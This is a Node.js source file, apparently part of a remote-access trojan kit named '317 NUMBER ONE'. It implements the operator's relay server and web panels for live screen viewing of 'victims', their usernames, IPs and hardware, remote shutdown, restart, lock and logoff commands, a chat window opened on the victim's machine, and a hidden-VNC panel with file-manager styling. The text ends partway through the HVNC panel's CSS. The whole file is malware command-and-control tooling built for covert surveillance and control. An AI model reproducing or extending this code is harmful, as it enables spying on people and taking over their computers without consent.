// 317 NUMBER ONE - Stream Relay Server
// Run this on YOUR server/VPS: node stream-server.js
// Victims connect here, you view their screens from here

const http = require('http');
const PORT = parseInt(process.argv[2] || '7317');

// Store active sessions: agentId -> { systemInfo, screenshot, lastSeen, commands }
const sessions = new Map();

// HVNC sessions: agentId -> { desktopName, screenshot, lastSeen, hvncCommands }
const hvncSessions = new Map();

/**
 * Build the premium web panel HTML
 */
function buildPanelHTML(session, agentId) {
  const si = session.systemInfo;
  return `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>317 Stream — ${agentId}</title>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
<style>
*{margin:0;padding:0;box-sizing:border-box}
:root{
  --bg:#000000;--card:rgba(10,10,10,0.95);--card-border:rgba(255,255,255,0.08);
  --accent:#ffffff;--accent-hover:#d4d4d4;--accent-glow:rgba(255,255,255,0.1);
  --success:#10b981;--danger:#ef4444;--warning:#f59e0b;--info:#60a5fa;
  --text:#f0f0f0;--muted:#737373;--dim:#262626;
}
body{font-family:'Inter',sans-serif;background:var(--bg);color:var(--text);height:100vh;overflow:hidden;display:flex;flex-direction:column}
.topbar{display:flex;align-items:center;justify-content:space-between;padding:14px 24px;
  background:var(--card);border-bottom:1px solid var(--card-border);backdrop-filter:blur(20px);z-index:10}
.topbar-left{display:flex;align-items:center;gap:14px}
.logo{font-size:18px;font-weight:800;letter-spacing:1px;
  background:linear-gradient(135deg,#ffffff,#a3a3a3);-webkit-background-clip:text;-webkit-text-fill-color:transparent}
.badge{display:inline-flex;align-items:center;gap:6px;padding:4px 12px;border-radius:20px;font-size:11px;font-weight:600;text-transform:uppercase;letter-spacing:.5px}
.badge-live{background:rgba(16,185,129,0.15);color:var(--success);border:1px solid rgba(16,185,129,0.3)}
.badge-live .dot{width:7px;height:7px;border-radius:50%;background:var(--success);animation:pulse 1.5s ease-in-out infinite}
@keyframes pulse{0%,100%{opacity:1;transform:scale(1)}50%{opacity:.4;transform:scale(.7)}}
.agent-tag{font-size:13px;font-weight:600;color:var(--muted);background:rgba(100,116,139,0.1);padding:5px 14px;border-radius:8px;border:1px solid rgba(100,116,139,0.15);font-family:monospace;letter-spacing:1px}
.main{display:flex;flex:1;overflow:hidden}
.screen-area{flex:1;display:flex;align-items:center;justify-content:center;padding:20px;position:relative;
  background:radial-gradient(ellipse at center,rgba(255,255,255,0.02) 0%,transparent 70%)}
.screen-wrapper{position:relative;max-width:100%;max-height:100%;border-radius:12px;overflow:hidden;
  box-shadow:0 0 40px rgba(255,255,255,0.03),0 0 80px rgba(255,255,255,0.01);border:1px solid var(--card-border)}
.screen-wrapper img{display:block;max-width:100%;max-height:calc(100vh - 120px);object-fit:contain;background:#000}
.screen-overlay{position:absolute;top:12px;left:12px;display:flex;gap:8px}
.screen-badge{padding:3px 10px;border-radius:6px;font-size:10px;font-weight:600;backdrop-filter:blur(10px)}
.screen-fps{background:rgba(0,0,0,0.6);color:var(--success)}
.screen-res{background:rgba(0,0,0,0.6);color:var(--muted)}
.screen-loading{position:absolute;inset:0;display:flex;align-items:center;justify-content:center;background:rgba(6,6,11,0.9);z-index:5;transition:opacity .3s}
.screen-loading.hidden{opacity:0;pointer-events:none}
.spinner{width:40px;height:40px;border:3px solid var(--dim);border-top-color:var(--accent);border-radius:50%;animation:spin .8s linear infinite}
@keyframes spin{to{transform:rotate(360deg)}}
.sidebar{width:300px;background:var(--card);border-left:1px solid var(--card-border);backdrop-filter:blur(20px);
  display:flex;flex-direction:column;overflow-y:auto}
.sidebar-section{padding:18px 20px;border-bottom:1px solid var(--card-border)}
.section-title{font-size:10px;font-weight:700;text-transform:uppercase;letter-spacing:1.5px;color:var(--muted);margin-bottom:14px;display:flex;align-items:center;gap:8px}
.section-title::before{content:'';width:3px;height:12px;background:var(--accent);border-radius:2px}
.info-item{display:flex;justify-content:space-between;align-items:center;padding:8px 0;border-bottom:1px solid rgba(51,65,85,0.2)}
.info-item:last-child{border-bottom:none}
.info-label{font-size:12px;color:var(--muted);font-weight:500}
.info-value{font-size:12px;font-weight:600;color:var(--text);font-family:monospace;max-width:160px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
.controls{display:flex;flex-direction:column;gap:8px}
.ctrl-btn{display:flex;align-items:center;gap:10px;padding:10px 14px;border-radius:10px;border:1px solid;
  cursor:pointer;font-size:12px;font-weight:600;font-family:'Inter',sans-serif;transition:all .25s ease;background:transparent}
.ctrl-btn:hover{transform:translateX(4px)}
.ctrl-btn:active{transform:scale(.97)}
.ctrl-btn .icon{font-size:16px;width:28px;text-align:center}
.btn-shutdown{color:var(--danger);border-color:rgba(239,68,68,0.2)}.btn-shutdown:hover{background:rgba(239,68,68,0.1)}
.btn-restart{color:var(--warning);border-color:rgba(245,158,11,0.2)}.btn-restart:hover{background:rgba(245,158,11,0.1)}
.btn-sleep{color:var(--info);border-color:rgba(59,130,246,0.2)}.btn-sleep:hover{background:rgba(59,130,246,0.1)}
.btn-lock{color:var(--accent);border-color:rgba(255,255,255,0.15)}.btn-lock:hover{background:rgba(255,255,255,0.05)}
.btn-logoff{color:var(--muted);border-color:rgba(100,116,139,0.2)}.btn-logoff:hover{background:rgba(100,116,139,0.1)}
.btn-chat{color:#a78bfa;border-color:rgba(167,139,250,0.2)}.btn-chat:hover{background:rgba(167,139,250,0.1)}
.btn-chat.active{background:rgba(167,139,250,0.2);border-color:rgba(167,139,250,0.5);box-shadow:0 0 12px rgba(167,139,250,0.15)}
.chat-panel{display:none;flex-direction:column;height:320px;border-top:1px solid var(--card-border);animation:slideUp .3s ease}
.chat-panel.open{display:flex}
@keyframes slideUp{from{opacity:0;transform:translateY(10px)}to{opacity:1;transform:translateY(0)}}
.chat-header{display:flex;align-items:center;justify-content:space-between;padding:12px 16px;border-bottom:1px solid var(--card-border)}
.chat-header-left{display:flex;align-items:center;gap:8px}
.chat-header-title{font-size:12px;font-weight:700;color:#a78bfa;text-transform:uppercase;letter-spacing:.5px}
.chat-header-dot{width:6px;height:6px;border-radius:50%;background:#a78bfa;animation:pulse 1.5s ease-in-out infinite}
.chat-close{background:none;border:none;color:var(--muted);cursor:pointer;font-size:16px;padding:4px;border-radius:4px;transition:all .2s}
.chat-close:hover{color:var(--danger);background:rgba(239,68,68,0.1)}
.chat-messages{flex:1;overflow-y:auto;padding:12px 14px;display:flex;flex-direction:column;gap:8px;scrollbar-width:thin;scrollbar-color:rgba(255,255,255,0.1) transparent}
.chat-messages::-webkit-scrollbar{width:4px}
.chat-messages::-webkit-scrollbar-thumb{background:rgba(255,255,255,0.1);border-radius:2px}
.chat-msg{max-width:85%;padding:8px 12px;border-radius:12px;font-size:12px;line-height:1.4;word-wrap:break-word;animation:msgIn .2s ease}
@keyframes msgIn{from{opacity:0;transform:scale(.95)}to{opacity:1;transform:scale(1)}}
.chat-msg.panel{align-self:flex-end;background:rgba(167,139,250,0.2);color:#e2e8f0;border-bottom-right-radius:4px}
.chat-msg.victim{align-self:flex-start;background:rgba(255,255,255,0.08);color:#e2e8f0;border-bottom-left-radius:4px}
.chat-msg .msg-time{font-size:9px;color:var(--muted);margin-top:4px;display:block}
.chat-input-area{display:flex;gap:8px;padding:10px 14px;border-top:1px solid var(--card-border)}
.chat-input{flex:1;background:rgba(255,255,255,0.05);border:1px solid rgba(255,255,255,0.1);border-radius:8px;padding:8px 12px;color:var(--text);font-size:12px;font-family:'Inter',sans-serif;outline:none;transition:border-color .2s}
.chat-input:focus{border-color:rgba(167,139,250,0.5)}
.chat-input::placeholder{color:var(--muted)}
.chat-send{background:rgba(167,139,250,0.2);border:1px solid rgba(167,139,250,0.3);border-radius:8px;padding:8px 14px;color:#a78bfa;font-size:12px;font-weight:600;cursor:pointer;font-family:'Inter',sans-serif;transition:all .2s}
.chat-send:hover{background:rgba(167,139,250,0.35);transform:scale(1.02)}
.chat-send:active{transform:scale(.97)}
.chat-empty{text-align:center;color:var(--muted);font-size:11px;padding:40px 0;opacity:.6}
.statusbar{display:flex;align-items:center;justify-content:space-between;padding:8px 20px;
  background:var(--card);border-top:1px solid var(--card-border);font-size:11px;color:var(--muted)}
.toast{position:fixed;bottom:60px;right:24px;padding:12px 20px;border-radius:10px;font-size:12px;font-weight:600;
  backdrop-filter:blur(12px);z-index:100;transform:translateY(20px);opacity:0;transition:all .3s ease;pointer-events:none}
.toast.show{transform:translateY(0);opacity:1}
.toast-success{background:rgba(16,185,129,0.15);color:var(--success);border:1px solid rgba(16,185,129,0.3)}
.toast-danger{background:rgba(239,68,68,0.15);color:var(--danger);border:1px solid rgba(239,68,68,0.3)}
.modal-overlay{position:fixed;inset:0;background:rgba(0,0,0,0.7);backdrop-filter:blur(4px);z-index:200;display:none;align-items:center;justify-content:center}
.modal-overlay.active{display:flex}
.modal{background:var(--card);border:1px solid var(--card-border);border-radius:16px;padding:28px;width:360px;text-align:center;backdrop-filter:blur(20px)}
.modal h3{font-size:16px;font-weight:700;margin-bottom:8px}
.modal p{font-size:13px;color:var(--muted);margin-bottom:20px}
.modal-actions{display:flex;gap:10px;justify-content:center}
.modal-btn{padding:9px 24px;border-radius:10px;border:none;cursor:pointer;font-size:12px;font-weight:600;font-family:'Inter',sans-serif;transition:all .2s}
.modal-cancel{background:rgba(100,116,139,0.15);color:var(--muted)}.modal-cancel:hover{background:rgba(100,116,139,0.25)}
.modal-confirm{background:rgba(239,68,68,0.2);color:var(--danger)}.modal-confirm:hover{background:rgba(239,68,68,0.35)}
@media(max-width:900px){.sidebar{width:260px}}
@media(max-width:700px){.main{flex-direction:column}.sidebar{width:100%;max-height:40vh}}
</style>
</head>
<body>
<div class="topbar">
  <div class="topbar-left">
    <span class="logo">317 STREAM</span>
    <span class="badge badge-live"><span class="dot"></span> LIVE</span>
  </div>
  <span class="agent-tag">${agentId}</span>
</div>
<div class="main">
  <div class="screen-area">
    <div class="screen-wrapper">
      <div class="screen-loading" id="loadingOverlay"><div class="spinner"></div></div>
      <img id="screenImg" src="about:blank" alt="Live Screen" draggable="false">
      <div class="screen-overlay">
        <span class="screen-badge screen-fps" id="fpsTag">-- FPS</span>
        <span class="screen-badge screen-res" id="resTag">--</span>
      </div>
    </div>
  </div>
  <div class="sidebar">
    <div class="sidebar-section">
      <div class="section-title">System Information</div>
      <div class="info-item"><span class="info-label">Username</span><span class="info-value">${si.username || 'N/A'}</span></div>
      <div class="info-item"><span class="info-label">Computer</span><span class="info-value">${si.computerName || 'N/A'}</span></div>
      <div class="info-item"><span class="info-label">IP Address</span><span class="info-value">${si.ip || 'N/A'}</span></div>
      <div class="info-item"><span class="info-label">Country</span><span class="info-value">${si.country || 'N/A'}</span></div>
      <div class="info-item"><span class="info-label">CPU</span><span class="info-value" title="${si.cpu || ''}">${si.cpu || 'N/A'}</span></div>
      <div class="info-item"><span class="info-label">GPU</span><span class="info-value" title="${si.gpu || ''}">${si.gpu || 'N/A'}</span></div>
      <div class="info-item"><span class="info-label">RAM</span><span class="info-value">${si.ram || 'N/A'}</span></div>
      <div class="info-item"><span class="info-label">Uptime</span><span class="info-value" id="uptimeVal">--</span></div>
    </div>
    <div class="sidebar-section">
      <div class="section-title">Remote Controls</div>
      <div class="controls">
        <button class="ctrl-btn btn-shutdown" onclick="confirmAction('shutdown','Shutdown PC','This will immediately power off the target machine.')">
          <span class="icon">⏻</span> Shutdown
        </button>
        <button class="ctrl-btn btn-restart" onclick="confirmAction('restart','Restart PC','This will restart the target machine.')">
          <span class="icon">↻</span> Restart
        </button>
        <button class="ctrl-btn btn-sleep" onclick="sendCommand('sleep')">
          <span class="icon">🌙</span> Sleep Mode
        </button>
        <button class="ctrl-btn btn-lock" onclick="sendCommand('lock')">
          <span class="icon">🔒</span> Lock Screen
        </button>
        <button class="ctrl-btn btn-logoff" onclick="confirmAction('logoff','Log Off User','This will sign out the current user.')">
          <span class="icon">🚪</span> Log Off
        </button>
        <button class="ctrl-btn btn-chat" id="chatToggleBtn" onclick="toggleChat()">
          <span class="icon">💬</span> Live Chat
        </button>
        <button class="ctrl-btn btn-lock" onclick="window.open('/${agentId}/hvnc','_blank')">
          <span class="icon">🖥️</span> HVNC Panel
        </button>
      </div>
    </div>
    <div class="chat-panel" id="chatPanel">
      <div class="chat-header">
        <div class="chat-header-left">
          <span class="chat-header-dot"></span>
          <span class="chat-header-title">Live Chat</span>
        </div>
        <button class="chat-close" onclick="toggleChat()">✕</button>
      </div>
      <div class="chat-messages" id="chatMessages">
        <div class="chat-empty">Chat session will appear here...</div>
      </div>
      <div class="chat-input-area">
        <input class="chat-input" id="chatInput" type="text" placeholder="Type a message..." onkeydown="if(event.key==='Enter')sendChat()">
        <button class="chat-send" onclick="sendChat()">Send</button>
      </div>
    </div>
  </div>
</div>
<div class="statusbar">
  <span>317 NUMBER ONE Stream Session</span>
  <span id="lastUpdate">Connecting...</span>
</div>
<div class="toast" id="toast"></div>
<div class="modal-overlay" id="modal">
  <div class="modal">
    <h3 id="modalTitle">Confirm</h3>
    <p id="modalDesc">Are you sure?</p>
    <div class="modal-actions">
      <button class="modal-btn modal-cancel" onclick="closeModal()">Cancel</button>
      <button class="modal-btn modal-confirm" id="modalConfirm">Confirm</button>
    </div>
  </div>
</div>
<script>
const AGENT='${agentId}';
let frameCount=0,lastFpsTime=Date.now(),currentFps=0;
let _prevBlobUrl=null;
function displayFrame(blob){
  if(blob.size<200)return;
  const url=URL.createObjectURL(blob);
  const img=document.getElementById('screenImg');
  img.onload=function(){
    document.getElementById('loadingOverlay').classList.add('hidden');
    document.getElementById('resTag').textContent=img.naturalWidth+'x'+img.naturalHeight;
    if(_prevBlobUrl)URL.revokeObjectURL(_prevBlobUrl);
    _prevBlobUrl=url;
  };
  img.src=url;
  frameCount++;
  const now=Date.now();
  if(now-lastFpsTime>=2000){currentFps=Math.round(frameCount/((now-lastFpsTime)/1000));frameCount=0;lastFpsTime=now;
    document.getElementById('fpsTag').textContent=currentFps+' FPS';}
  document.getElementById('lastUpdate').textContent='Last frame: '+new Date().toLocaleTimeString();
}
function createFetchStream(){
  async function loop(){
    while(true){
      try{
        const r=await fetch('/'+AGENT+'/screen?t='+Date.now());
        if(!r.ok){await new Promise(r=>setTimeout(r,500));continue;}
        const blob=await r.blob();
        displayFrame(blob);
      }catch(e){
        document.getElementById('lastUpdate').textContent='Connection lost...';
        await new Promise(r=>setTimeout(r,2000));
      }
    }
  }
  loop();
}
createFetchStream();
createFetchStream();
createFetchStream();
function updateUptime(){
  fetch('/'+AGENT+'/info').then(r=>r.json()).then(d=>{
    const h=Math.floor(d.uptime/60),m=d.uptime%60;
    document.getElementById('uptimeVal').textContent=h+'h '+m+'m';
  }).catch(()=>{});
}
updateUptime();setInterval(updateUptime,30000);
async function sendCommand(action){
  try{
    const r=await fetch('/'+AGENT+'/command',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({action})});
    const d=await r.json();
    if(d.success){showToast('Command queued: '+action,'success');}else{showToast('Command failed','danger');}
  }catch(e){showToast('Connection error','danger');}
}
let pendingAction=null;
function confirmAction(action,title,desc){
  pendingAction=action;
  document.getElementById('modalTitle').textContent=title;
  document.getElementById('modalDesc').textContent=desc;
  document.getElementById('modal').classList.add('active');
}
function closeModal(){document.getElementById('modal').classList.remove('active');pendingAction=null;}
document.getElementById('modalConfirm').onclick=function(){if(pendingAction){sendCommand(pendingAction);}closeModal();};
function showToast(msg,type){
  const t=document.getElementById('toast');
  t.textContent=msg;t.className='toast toast-'+type+' show';
  setTimeout(()=>{t.classList.remove('show');},2500);
}
// ===== LIVE CHAT =====
let chatOpen=false,chatPollInterval=null,lastChatTimestamp=0;
async function toggleChat(){
  const panel=document.getElementById('chatPanel');
  const btn=document.getElementById('chatToggleBtn');
  if(!chatOpen){
    try{
      await fetch('/'+AGENT+'/chat/start',{method:'POST'});
      panel.classList.add('open');btn.classList.add('active');
      chatOpen=true;
      showToast('Chat opened on victim','success');
      startChatPolling();
    }catch(e){showToast('Failed to open chat','danger');}
  }else{
    try{
      await fetch('/'+AGENT+'/chat/stop',{method:'POST'});
    }catch(e){}
    panel.classList.remove('open');btn.classList.remove('active');
    chatOpen=false;
    stopChatPolling();
  }
}
function startChatPolling(){
  if(chatPollInterval)return;
  chatPollInterval=setInterval(pollChat,1500);
  pollChat();
}
function stopChatPolling(){
  if(chatPollInterval){clearInterval(chatPollInterval);chatPollInterval=null;}
}
async function pollChat(){
  try{
    const r=await fetch('/'+AGENT+'/chat?since='+lastChatTimestamp);
    const d=await r.json();
    if(d.messages&&d.messages.length>0){
      const container=document.getElementById('chatMessages');
      const emptyMsg=container.querySelector('.chat-empty');
      if(emptyMsg)emptyMsg.remove();
      d.messages.forEach(function(m){
        if(m.timestamp>lastChatTimestamp)lastChatTimestamp=m.timestamp;
        const div=document.createElement('div');
        div.className='chat-msg '+(m.from==='panel'?'panel':'victim');
        const time=new Date(m.timestamp).toLocaleTimeString([],{hour:'2-digit',minute:'2-digit'});
        div.innerHTML=escapeHtml(m.text)+'<span class="msg-time">'+(m.from==='victim'?'Victim':'You')+' · '+time+'</span>';
        container.appendChild(div);
      });
      container.scrollTop=container.scrollHeight;
    }
  }catch(e){}
}
function escapeHtml(t){return t.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');}
async function sendChat(){
  const input=document.getElementById('chatInput');
  const text=input.value.trim();
  if(!text)return;
  input.value='';
  try{
    await fetch('/'+AGENT+'/chat',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({text})});
    const container=document.getElementById('chatMessages');
    const emptyMsg=container.querySelector('.chat-empty');
    if(emptyMsg)emptyMsg.remove();
    const div=document.createElement('div');
    div.className='chat-msg panel';
    const time=new Date().toLocaleTimeString([],{hour:'2-digit',minute:'2-digit'});
    div.innerHTML=escapeHtml(text)+'<span class="msg-time">You · '+time+'</span>';
    container.appendChild(div);
    container.scrollTop=container.scrollHeight;
    lastChatTimestamp=Date.now();
  }catch(e){showToast('Failed to send message','danger');}
}

</script>
</body>
</html>`;
}

/**
 * Build the HVNC Panel HTML — Premium Black & White Design
 */
function buildHvncPanelHTML(hvncSession, agentId) {
  return `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>317 HVNC — ${agentId}</title>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
<style>
*{margin:0;padding:0;box-sizing:border-box}
:root{
  --bg:#000000;--bg-deep:#030303;--card:rgba(8,8,8,0.98);--card-border:rgba(255,255,255,0.06);
  --accent:#ffffff;--accent-dim:rgba(255,255,255,0.7);--accent-glow:rgba(255,255,255,0.04);
  --text:#f5f5f5;--muted:#6b6b6b;--dim:#1a1a1a;--hover:rgba(255,255,255,0.03);
  --success:#22c55e;--danger:#ef4444;--warning:#eab308;
}
body{font-family:'Inter',sans-serif;background:var(--bg);color:var(--text);height:100vh;overflow:hidden;display:flex;flex-direction:column}
.topbar{display:flex;align-items:center;justify-content:space-between;padding:12px 24px;
  background:var(--card);border-bottom:1px solid var(--card-border);backdrop-filter:blur(20px)}
.topbar-left{display:flex;align-items:center;gap:16px}
.logo{font-size:15px;font-weight:800;letter-spacing:2px;color:var(--accent);text-transform:uppercase}
.logo-sub{font-size:10px;font-weight:500;color:var(--muted);letter-spacing:3px;text-transform:uppercase}
.badge{display:inline-flex;align-items:center;gap:6px;padding:4px 12px;border-radius:20px;font-size:10px;font-weight:700;text-transform:uppercase;letter-spacing:1px}
.badge-hvnc{background:rgba(255,255,255,0.05);color:var(--accent);border:1px solid rgba(255,255,255,0.12)}
.badge-hvnc .dot{width:6px;height:6px;border-radius:50%;background:var(--success);animation:pulse 1.5s ease-in-out infinite}
@keyframes pulse{0%,100%{opacity:1;transform:scale(1)}50%{opacity:.3;transform:scale(.6)}}
.agent-tag{font-size:11px;font-weight:600;color:var(--muted);background:rgba(255,255,255,0.03);padding:5px 14px;border-radius:6px;border:1px solid var(--card-border);font-family:'JetBrains Mono',monospace;letter-spacing:1.5px}
.main{display:flex;flex:1;overflow:hidden}
.screen-area{flex:1;display:flex;align-items:center;justify-content:center;padding:16px;position:relative;
  background:var(--bg-deep);cursor:crosshair}
.screen-wrapper{position:relative;max-width:100%;max-height:100%;border-radius:8px;overflow:hidden;
  box-shadow:0 0 60px rgba(255,255,255,0.02);border:1px solid var(--card-border)}
.screen-wrapper img{display:block;max-width:100%;max-height:calc(100vh - 110px);object-fit:contain;background:#000;image-rendering:auto}
.screen-overlay{position:absolute;top:10px;left:10px;display:flex;gap:6px}
.screen-badge{padding:3px 8px;border-radius:4px;font-size:9px;font-weight:600;backdrop-filter:blur(8px);font-family:'JetBrains Mono',monospace}
.screen-fps{background:rgba(0,0,0,0.7);color:var(--success);border:1px solid rgba(34,197,94,0.2)}
.screen-res{background:rgba(0,0,0,0.7);color:var(--muted);border:1px solid rgba(255,255,255,0.06)}
.screen-loading{position:absolute;inset:0;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:16px;background:rgba(0,0,0,0.95);z-index:5;transition:opacity .4s}
.screen-loading.hidden{opacity:0;pointer-events:none}
.spinner{width:32px;height:32px;border:2px solid var(--dim);border-top-color:var(--accent);border-radius:50%;animation:spin .7s linear infinite}
@keyframes spin{to{transform:rotate(360deg)}}
.loading-text{font-size:11px;color:var(--muted);letter-spacing:2px;text-transform:uppercase}
.sidebar{width:280px;background:var(--card);border-left:1px solid var(--card-border);
  display:flex;flex-direction:column;overflow-y:auto;scrollbar-width:thin;scrollbar-color:rgba(255,255,255,0.05) transparent}
.sidebar::-webkit-scrollbar{width:3px}
.sidebar::-webkit-scrollbar-thumb{background:rgba(255,255,255,0.08);border-radius:2px}
.sidebar-section{padding:16px 18px;border-bottom:1px solid var(--card-border)}
.section-title{font-size:9px;font-weight:700;text-transform:uppercase;letter-spacing:2px;color:var(--muted);margin-bottom:12px;display:flex;align-items:center;gap:8px}
.section-title::before{content:'';width:2px;height:10px;background:var(--accent);border-radius:1px}
.app-grid{display:grid;grid-template-columns:1fr 1fr;gap:6px}
.app-btn{display:flex;flex-direction:column;align-items:center;gap:6px;padding:12px 8px;border-radius:8px;border:1px solid var(--card-border);
  cursor:pointer;font-size:10px;font-weight:600;font-family:'Inter',sans-serif;transition:all .2s ease;background:transparent;color:var(--text)}
.app-btn:hover{background:rgba(255,255,255,0.04);border-color:rgba(255,255,255,0.12);transform:translateY(-1px)}
.app-btn:active{transform:scale(.96)}
.app-btn .icon{font-size:20px;opacity:.8}
.app-btn span{letter-spacing:.3px}
.input-section{padding:14px 18px;border-bottom:1px solid var(--card-border)}
.input-row{display:flex;gap:6px}
.input-field{flex:1;background:rgba(255,255,255,0.03);border:1px solid var(--card-border);border-radius:6px;padding:8px 12px;color:var(--text);font-size:11px;font-family:'Inter',sans-serif;outline:none;transition:border-color .2s}
.input-field:focus{border-color:rgba(255,255,255,0.2)}
.input-field::placeholder{color:var(--muted)}
.send-btn{background:rgba(255,255,255,0.06);border:1px solid rgba(255,255,255,0.1);border-radius:6px;padding:8px 14px;color:var(--accent);font-size:10px;font-weight:700;cursor:pointer;font-family:'Inter',sans-serif;transition:all .2s;letter-spacing:.5px;text-transform:uppercase}
.send-btn:hover{background:rgba(255,255,255,0.1)}
.action-list{display:flex;flex-direction:column;gap:4px}
.action-btn{display:flex;align-items:center;gap:10px;padding:9px 12px;border-radius:6px;border:1px solid var(--card-border);
  cursor:pointer;font-size:11px;font-weight:500;font-family:'Inter',sans-serif;transition:all .2s ease;background:transparent;color:var(--text)}
.action-btn:hover{background:rgba(255,255,255,0.03);border-color:rgba(255,255,255,0.1)}
.action-btn .icon{font-size:14px;width:24px;text-align:center;opacity:.6}
.action-btn.danger{color:var(--danger)}.action-btn.danger:hover{background:rgba(239,68,68,0.05);border-color:rgba(239,68,68,0.15)}
.statusbar{display:flex;align-items:center;justify-content:space-between;padding:7px 20px;
  background:var(--card);border-top:1px solid var(--card-border);font-size:10px;color:var(--muted);font-family:'JetBrains Mono',monospace}
.status-left{display:flex;align-items:center;gap:12px}
.status-dot{width:5px;height:5px;border-radius:50%;background:var(--success)}
.toast{position:fixed;bottom:50px;right:20px;padding:10px 18px;border-radius:8px;font-size:11px;font-weight:600;
  backdrop-filter:blur(12px);z-index:100;transform:translateY(20px);opacity:0;transition:all .3s ease;pointer-events:none;
  font-family:'Inter',sans-serif}
.toast.show{transform:translateY(0);opacity:1}
.toast-success{background:rgba(34,197,94,0.1);color:var(--success);border:1px solid rgba(34,197,94,0.2)}
.toast-danger{background:rgba(239,68,68,0.1);color:var(--danger);border:1px solid rgba(239,68,68,0.2)}
.cursor-indicator{position:absolute;width:8px;height:8px;border:1.5px solid var(--accent);border-radius:50%;pointer-events:none;transition:all .05s;opacity:0;z-index:10}
.cursor-indicator.active{opacity:1}
.tab-nav{display:flex;align-items:center;gap:0;margin-left:24px}
.tab-btn{padding:10px 20px;font-size:11px;font-weight:700;text-transform:uppercase;letter-spacing:1.5px;color:var(--muted);background:none;border:none;border-bottom:2px solid transparent;cursor:pointer;font-family:'Inter',sans-serif;transition:all .2s}
.tab-btn:hover{color:var(--text)}
.tab-btn.active{color:#ef4444;border-bottom-color:#ef4444}
.tab-panel{display:none;flex:1;overflow:hidden}
.tab-panel.active{display:flex}
.fm-fullpanel{flex:1;display:flex;flex-direction:column;background:var(--bg-deep);overflow:hidden}
.fm-pathbar{display:flex;align-items:center;padding:12px 20px;background:var(--card);border-bottom:1px solid var(--card-border)}
.fm-pathbar input{flex:1;background:rgba(255,255,255,0.04);border:1px solid var(--card-border);border-radius:6px;padding:8px 14px;color:var(--text);font-size:12px;font-family:'JetBrains Mono',monospace;outline:none}
.fm-pathbar input:focus{border-color:rgba(255,255,255,0.15)}
.fm-pathbar-btns{display:flex;gap:6px;margin-left:10px}
.fm-pathbar-btn{background:rgba(255,255,255,0.05);border:1px solid var(--card-border);border-radius:6px;padding:7px 14px;color:var(--text);font-size:10px;font-weight:600;cursor:pointer;font-family:'Inter',sans-serif;transition:all .15s;white-space:nowrap}
.fm-pathbar-btn:hover{background:rgba(255,255,255,0.08);border-color:rgba(255,255,255,0.12)}
.fm-filelist{flex:1;overflow-y:auto;padding:4px 0;scrollbar-width:thin;scrollbar-color:rgba(255,255,255,0.05) transparent}
.fm-filelist::-webkit-scrollbar{width:5px}
.fm-filelist::-webkit-scrollbar-thumb{background:rgba(255,255,255,0.08);border-radius:3px}
.fm-row{display:flex;align-items:center;padding:10px 20px;border-bottom:1px solid rgba(255,255,255,0.03);cursor:pointer;transition:background .12s}
.fm-row:hover{background:rgba(255,255,255,0.03)}
.fm-row-icon{width:28px;height:28px;display:flex;align-items:center;justify-content:center;margin-right:14px;font-size:18px;flex-shrink:0}
.fm-row-icon.folder{color:#f0c040}
.fm-row-icon.file{color:var(--muted)}
.fm-row-name{flex:1;font-size:13px;font-weight:500;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
.fm-row-size{font-size:11px;color:var(--muted);font-family:'JetBrains Mono',monospace;min-width:80px;text-align:right;margin-right:12px}
.fm-row-date{font-size:11px;color:var(--muted);font-family:'JetBrains Mono',monospace;min-width:140px;text-align:right;margin-right:12px}
.fm-row-actions{display:flex;gap:6px;opacity:0;transition:opacity .15s}
.fm-row:hover .fm-row-actions{opacity:1}
.fm-row-act{background:none;border:1px solid var(--card-border);color:var(--muted);padding:4px 8px;border-radius:4px;cursor:pointer;font-size:10px;transition:all .15s}
.fm-row-act:hover{color:var(--accent);border-color:rgba(255,255,255,0.2)}
.fm-row-act.danger:hover{color:var(--danger);border-color:rgba(239,68,68,0.3)}
.fm-empty-full{display:flex;align-items:center;justify-content:center;flex:1;color:var(--muted);font-size:13px}
.fm-container{display:flex;flex-direction:column;gap:6px}
.fm-breadcrumb{display:flex;align-items:center;gap:4px;padding:6px 8px;background:rgba(255,255,255,0.02);border-radius:4px;border:1px solid var(--card-border);overflow-x:auto;scrollbar-width:none}
.fm-breadcrumb::-webkit-scrollbar{display:none}
.fm-crumb{font-size:9px;color:var(--muted);cursor:pointer;white-space:nowrap;padding:2px 4px;border-radius:3px;font-family:'JetBrains Mono',monospace}
.fm-crumb:hover{color:var(--accent);background:rgba(255,255,255,0.04)}
.fm-crumb.active{color:var(--accent)}
.fm-sep{font-size:8px;color:var(--muted);opacity:.4}
.fm-list{max-height:200px;overflow-y:auto;display:flex;flex-direction:column;gap:2px;scrollbar-width:thin;scrollbar-color:rgba(255,255,255,0.05) transparent}
.fm-list::-webkit-scrollbar{width:3px}
.fm-list::-webkit-scrollbar-thumb{background:rgba(255,255,255,0.08);border-radius:2px}
.fm-item{display:flex;align-items:center;gap:8px;padding:6px 8px;border-radius:4px;border:1px solid transparent;cursor:pointer;transition:all .15s}
.fm-item:hover{background:rgba(255,255,255,0.03);border-color:var(--card-border)}
.fm-item-icon{font-size:14px;width:20px;text-align:center;flex-shrink:0}
.fm-item-name{flex:1;font-size:10px;font-weight:500;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
.fm-item-meta{font-size:9px;color:var(--muted);font-family:'JetBrains Mono',monospace;white-space:nowrap}
.fm-item-actions{display:flex;gap:3px;opacity:0;transition:opacity .15s}
.fm-item:hover .fm-item-actions{opacity:1}
.fm-action-btn{background:none;border:1px solid var(--card-border);color:var(--muted);padding:2px 5px;border-radius:3px;cursor:pointer;font-size:8px;font-family:'Inter',sans-serif;transition:all .15s}
.fm-action-btn:hover{color:var(--accent);border-color:rgba(255,255,255,0.2)}
